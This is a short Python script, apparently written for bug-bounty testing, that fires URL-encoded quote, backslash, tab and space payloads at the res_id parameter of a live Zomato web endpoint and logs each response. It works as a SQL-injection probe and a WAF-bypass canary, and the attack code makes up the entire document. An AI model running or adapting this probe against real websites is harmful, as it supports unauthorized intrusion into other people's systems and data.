# -*- coding: utf-8 -*-
"""ET62: quote-sequence differential + WAF space-bypass canary on res_id"""
import ssl, http.client, time

ctx = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36"

VARIANTS = [
    ("3%27", "quote1"),          # expect 500 (known)
    ("3%27%27", "quote2"),       # if string context: could recover
    ("3%27%27%27", "quote3"),    # if string context: breaks again
    ("3%5C%27", "bslash-quote"), # backslash escape style
    ("3%09", "tab-tail"),        # WAF canary: tab
    ("3%09and%091", "tab-and"),  # and without '='
    ("3%20", "space-tail"),      # WAF canary: space
    ("3%23", "hash"),            # fragment char
]

def get(path):
    try:
        conn = http.client.HTTPSConnection("www.zomato.com", 443, timeout=15, context=ctx)
        conn.request("GET", path, headers={"User-Agent": UA, "Accept": "application/json,*/*",
                     "X-Hackerone": "xxbo", "Referer": "https://www.zomato.com/ncr/restaurants?q=pizza"})
        r = conn.getresponse()
        raw = r.read(20000)
        conn.close()
        body = raw.decode("utf-8", "replace")[:120].replace("\n", " ")
        print("[%d len=%d] %-58s %s" % (r.status, len(raw), path[:58], body), flush=True)
    except Exception as e:
        print("[EXC] %-58s %s" % (path[:58], repr(e)[:90]), flush=True)

for v, tag in VARIANTS:
    get("/webroutes/restaurant/info?res_id=" + v)
    time.sleep(0.8)
print("done", flush=True)
